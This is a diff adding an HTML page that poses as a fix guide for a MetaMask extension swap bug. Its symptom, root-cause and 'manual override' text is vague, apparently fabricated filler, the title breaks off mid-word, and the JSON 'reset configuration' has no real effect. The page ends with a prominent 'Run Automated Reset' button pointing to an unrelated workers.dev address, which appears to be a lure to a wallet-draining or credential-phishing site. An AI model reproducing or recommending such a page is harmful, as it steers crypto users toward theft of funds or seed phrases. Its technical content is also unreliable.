@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Swaps Changing The Destination Token Cha – Fix Guide</title>
+<style>
+    body {
+        font-family: -apple-system;
+        background: #0a0c10;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff9455; }
+    .btn {
+        background: #00adb5;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Swaps Changing The Destination Token Cha</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users of the Metamask extension on the Ethereum (ETH) ecosystem may encounter a bug where swapping tokens results in an unexpected behavior: when attempting to change the destination token in a swap, the source token is modified instead.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>This error occurs due to a logical inconsistency in the Metamask extension's swap functionality, where the input fields for source and destination tokens are not properly isolated, leading to unintended token swaps.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To manually correct this issue, users can attempt the following steps:</li>
+<li>Refresh the Metamask extension and retry the swap.</li>
+<li>Clear the Metamask extension's storage and restart the browser.</li>
+<li>Use the following JSON configuration to reset the swap settings:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;sourceToken&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ETH&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;destinationToken&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;DAI&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;amount&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;1.0&quot;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>Consider utilizing an external console for more complex token swap operations.</p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured.</li>
+<li>Ethereum (ETH) wallet with sufficient balance.</li>
+<li>Stable internet connection for seamless transactions.</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
